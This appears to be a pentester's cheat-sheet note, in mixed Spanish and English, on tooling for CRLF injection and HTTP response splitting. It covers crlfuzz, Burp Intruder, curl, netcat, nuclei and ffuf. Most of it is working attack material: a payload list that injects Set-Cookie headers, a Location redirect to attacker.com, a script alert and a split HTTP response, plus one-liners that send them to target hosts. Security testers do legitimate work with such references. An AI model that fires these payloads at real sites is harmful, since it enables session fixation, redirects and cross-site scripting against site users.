---
aliases:
  - crlfuzz
  - CRLF Wordlists
  - Burp CRLF Injection
tags:
  - type/tool
  - vuln/crlf-injection
  - technique/discovery
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: Tool
linked:
  - '[[CRLF Injection]]'
  - '[[Burp Suite]]'
---
# CRLF Injection - Tooling

***

## crlfuzz (Go)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Repo | `go install github.com/dwisiswant0/crlfuzz/cmd/crlfuzz@latest` | Modern Go fuzzer. |
| Single URL | `crlfuzz -u https://target.com` | Standard. |
| Multiple URLs | `crlfuzz -l urls.txt` | Bulk. |
| Custom payload | `-X custom_payload.txt` | Override default. |
| Verbose | `-v` | Debug. |
| Threads | `-c 50` | Parallel. |
| Output | `-o results.txt` | Save findings. |
| Pipe input | `cat urls.txt \| crlfuzz` | Pipeline-friendly. |
| Combine con `gau` / `waybackurls` | URL discovery + fuzz | Standard chain. |
| Combine con `httpx` | Pre-filter alive | Optimization. |
| HTTP method | `-X POST` | Default GET. |
| Custom headers | `-H "Cookie: ..."` | Authenticated. |
| Bypass-aware payloads | Built-in encoding variants | Default. |
^crlfi-tool-crlfuzz

___

## Burp Intruder + Payloads

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Mark position | Select param value en Repeater → Send to Intruder | Standard. |
| Sniper mode | Single position, multiple payloads | Default. |
| Payload set: CRLF | Custom list de CRLF variants | Manual. |
| Match conditions | Grep extract `X-Custom:` injected header | Validation. |
| Status code filter | 200, 302 (depends) | Differential. |
| Response length | Sort by length | Visual diff. |
| Burp BApp Store: CRLF | Some plugins | Pasivo. |
| Active scan | Includes CRLF check | Built-in. |
| Hackvertor | Encoding payloads | Custom. |
| Combine con Logger++ | Filter responses con anomalies | Pasivo. |
| Param Miner | Discover hidden params | Adjacent. |
| BCheck rules (Burp Pro 2024+) | Modern detection | Newer. |
| Send group con single connection | HTTP/1.1 specific | Edge. |
^crlfi-tool-burp

### Burp Intruder payload set

```
%0d%0aSet-Cookie:%20pwn=1
%0d%0aLocation:%20https://attacker.com
%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>
%0a%0aHeader:%20test
%0d%0aX-CRLFi:%201
%250d%250aSet-Cookie:%20pwn=1
%E5%98%8A%E5%98%8DSet-Cookie:%20pwn=1
%0d%0a%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<html>SPLIT</html>
```

___

## Wordlists (PayloadsAllTheThings)

| **Wordlist** | **Path / Repo** | **Uso** |
|:---:|:---:|:---:|
| PayloadsAllTheThings - CRLF Injection | https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/CRLF%20Injection | Standard. |
| HackTricks - CRLF | https://book.hacktricks.xyz/pentesting-web/crlf-0d-0a | Referencia. |
| SecLists - CRLF | `seclists/Fuzzing/CRLF-payloads/` | Standard. |
| OWASP - HTTP Response Splitting | OWASP guides | Defenses. |
| crlfuzz embedded | Built-in payloads en tool | Solid baseline. |
| Encoding variants list | URL / double / Unicode / etc | Comprehensive. |
| Server-specific bypass | Per-stack payloads | Per-target. |
| Bug bounty disclosed reports | HackerOne CRLF reports | Real-world. |
| Polyglot CRLF | Single payload con multiple encodings | Single-shot. |
| Defaults from `gxss` / `kxss` | XSS-related but reflective | Adjacent. |
^crlfi-tool-wordlists

___

## Manual curl con `--data-binary`

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Send raw request | `curl --data-binary $'header: value\r\nFoo: bar' ...` | Bash $'...' interprets escape. |
| Inject CRLF directly | `curl -H 'X-Header: value\r\nInjected: 1' ...` | Some curl versions reject. |
| Use `--header-data` | Custom headers | Per-version. |
| Verbose | `-v` | See request raw. |
| `-X POST` con body | Standard POST | Body manipulation. |
| Check response | `-i` includes headers | Verification. |
| `-D` save headers | Output headers a file | Forensic. |
| Custom URL encoding | Manual `%0d%0a` | Standard. |
| `--url-query` con encoded value | URL-encode at request | Edge. |
| Combine con `xxd` | View raw bytes | Debug. |
| Send via netcat | `nc -v target 80` con manual HTTP | Low-level. |
| Send via openssl s_client | TLS manual | Same low-level. |
^crlfi-tool-curl

### Manual one-liner

```bash
TARGET="https://target.com/redirect"
PARAM="url"

# Generate URL-encoded payload using printf
PAYLOAD=$(printf 'test%%0d%%0aSet-Cookie:%%20pwn=1')

# Send and inspect
curl -sI "${TARGET}?${PARAM}=${PAYLOAD}"

# Send raw via netcat (HTTP only)
echo -e "GET /redirect?url=test\r\nSet-Cookie: pwn=1 HTTP/1.1\r\nHost: target.com\r\n\r\n" | nc target.com 80
```

___

## Otros Tools

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `nuclei` templates | `nuclei -t vulnerabilities/generic/crlf-injection.yaml` | Bulk scan. |
| ffuf con encoded | `ffuf -u "https://target/?p=FUZZ" -w crlf-payloads.txt -mr 'X-Probe'` | Standard fuzzer. |
| `wfuzz` | `wfuzz -z file,payloads.txt --hh 0 https://target/?p=FUZZ` | Alternative. |
| Custom Python `requests` | Programmable | Standard. |
| Burp Repeater "Update Content-Length" | Auto-recalc | Required. |
| ZAP active scanner | OWASP ZAP CRLF rules | Free alt. |
| Manual proxy | `mitmproxy` with custom scripts | Programmable. |
| Combine con `hakrawler` | URL discovery | Recon. |
| `dalfox` con CRLF mode | Multi-vector scanner | XSS+CRLF. |
| `XSStrike` | Same family | XSS-focused. |
| Custom Bash + xargs | `cat urls.txt \| xargs -I {} curl -sI '{}?p=test%0d%0aFoo:bar' \| grep Foo` | Quick. |
^crlfi-tool-others

***
